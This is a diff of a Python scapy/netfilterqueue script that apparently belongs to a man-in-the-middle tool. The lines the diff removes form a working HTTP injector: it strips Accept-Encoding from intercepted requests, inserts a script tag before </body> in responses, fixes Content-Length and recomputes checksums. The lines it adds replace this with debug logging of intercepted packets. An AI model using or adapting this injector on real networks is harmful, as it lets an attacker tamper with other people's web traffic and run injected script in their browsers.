@@ -2,66 +2,39 @@ import scapy.all as scapy
 import traceback # Import the traceback module for detailed errors
 import netfilterqueue
 
-import re
-
-INJECTION_SCRIPT = b"<script>alert('MitM by Syn-apse!')</script>"
-
 def process_packet(packet):
+    print(f"[DEBUG] Packet received! Length: {len(packet.get_payload())}")
+    
     try:
         scapy_packet = scapy.IP(packet.get_payload())
+        print(f"[DEBUG] Parsed packet: {scapy_packet.summary()}")
         
-        if scapy_packet.haslayer(scapy.Raw) and scapy_packet.haslayer(scapy.TCP):
-            load = scapy_packet[scapy.Raw].load
-            modified = False
+        # Check if it has TCP layer
+        if scapy_packet.haslayer(scapy.TCP):
+            tcp_layer = scapy_packet[scapy.TCP]
+            print(f"[DEBUG] TCP packet - Sport: {tcp_layer.sport}, Dport: {tcp_layer.dport}")
             
-            # Strip Accept-Encoding from requests
-            if scapy_packet[scapy.TCP].dport == 80:
-                print("[HTTP] Intercepted HTTP Request")
-                load_str = load.decode('latin-1', errors='ignore')
-                # Fix the regex pattern
-                modified_load_str = re.sub(r"Accept-Encoding:.*?\r\n", "", load_str, flags=re.IGNORECASE)
-                modified_load = modified_load_str.encode('latin-1')
+            # Check if it has Raw layer (payload)
+            if scapy_packet.haslayer(scapy.Raw):
+                raw_data = scapy_packet[scapy.Raw].load
+                print(f"[DEBUG] Has Raw data, length: {len(raw_data)}")
                 
-                if modified_load != load:
-                    print("[HTTP] Stripped Accept-Encoding header")
-                    scapy_packet[scapy.Raw].load = modified_load
-                    modified = True
-                    
-            # Inject JavaScript into responses  
-            elif scapy_packet[scapy.TCP].sport == 80:
-                print("[HTTP] Intercepted HTTP Response")
-                if b"</body>" in load:
-                    print("[HTTP] Injecting JavaScript...")
-                    
-                    # Update Content-Length header
-                    load_str = load.decode('latin-1', errors='ignore')
-                    if "Content-Length:" in load_str:
-                        # Extract current content length
-                        content_length_match = re.search(r"Content-Length:\s*(\d+)", load_str)
-                        if content_length_match:
-                            old_length = int(content_length_match.group(1))
-                            new_length = old_length + len(INJECTION_SCRIPT)
-                            load_str = re.sub(r"Content-Length:\s*\d+", f"Content-Length: {new_length}", load_str)
-                    
-                    # Inject the script
-                    modified_load = load_str.replace("</body>", INJECTION_SCRIPT.decode('latin-1') + "</body>").encode('latin-1')
-                    scapy_packet[scapy.Raw].load = modified_load
-                    modified = True
-                    
-            # Recalculate checksums if modified
-            if modified:
-                del scapy_packet[scapy.IP].len
-                del scapy_packet[scapy.IP].chksum  
-                del scapy_packet[scapy.TCP].chksum
-                packet.set_payload(bytes(scapy_packet))
-                
-    except Exception:
-        print("[HTTP] Packet processing error")
+                # Check if it's HTTP
+                if tcp_layer.dport == 80 or tcp_layer.sport == 80:
+                    print("[DEBUG] HTTP traffic detected!")
+                    print(f"[DEBUG] First 100 bytes: {raw_data[:100]}")
+                else:
+                    print(f"[DEBUG] Non-HTTP TCP traffic: {tcp_layer.sport} -> {tcp_layer.dport}")
+            else:
+                print("[DEBUG] No Raw layer (no payload)")
+        else:
+            print("[DEBUG] Not a TCP packet")
+            
+    except Exception as e:
+        print(f"[DEBUG] Error parsing packet: {e}")
         traceback.print_exc()
     
     packet.accept()
-
-
 def start():
     queue = netfilterqueue.NetfilterQueue()
     queue.bind(0, process_packet)
